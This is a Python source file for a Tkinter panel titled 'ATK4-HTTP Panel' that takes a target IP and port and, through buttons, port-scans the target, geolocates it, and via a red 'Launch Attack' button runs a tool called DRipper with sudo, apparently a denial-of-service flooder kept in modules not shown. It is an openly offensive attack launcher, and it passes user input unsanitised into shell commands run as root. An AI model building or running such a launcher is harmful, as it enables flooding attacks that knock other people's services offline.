import sys
import os
import time 
from tkinter import *
from termcolor import colored
from requests import get 
 


def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))


os.system(' clear ')
os.system(' sudo hel.py ')
os.system(' clear ')
print("[+][+][+][+][+][+][+][+][+][+][+][+][+]")
print("[+] buttons will show along with input]")
print("[+][+][+][+][+][+][+][+][+][+][+][+][+]")

window=Tk()
window.title("ATK4-HTTP Panel ")
window.geometry('550x200')

def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

def scan():
    os.system(f' cd modules && python3 portscan.py {IP} ')
    restart_program()

def run():
    os.system(f' cd modules && sudo python3 DRipper.py -s {IP} -p {PO}  ')
    restart_program()

def clear():
    os.system(' clear ')
    restart_program()

def trace():
    os.system(' clear ')
    time.sleep(0.1)  
    track = get(f'https://ipapi.co/{IP}/json/')
    prYellow(track.json())  

IP = str(input(" IP ====>>"))

btn = Button(window, text="Scan IP", bg="green", fg="white", command=scan)
btn.grid(column=2, row=1)
btn = Button(window, text="Clear Window", bg="black", fg="white", command=clear)
btn.grid(column=3, row=1)
btn = Button(window, text="Track IP", bg="green", fg="white", command=trace)
btn.grid(column=4, row=1)

PO = str(input(" Port Number ====>> "))

btn = Button(window, text="Launch Attack", bg="red", fg="white",command=run)
btn.grid(column=5, row=3)

window.mainloop()
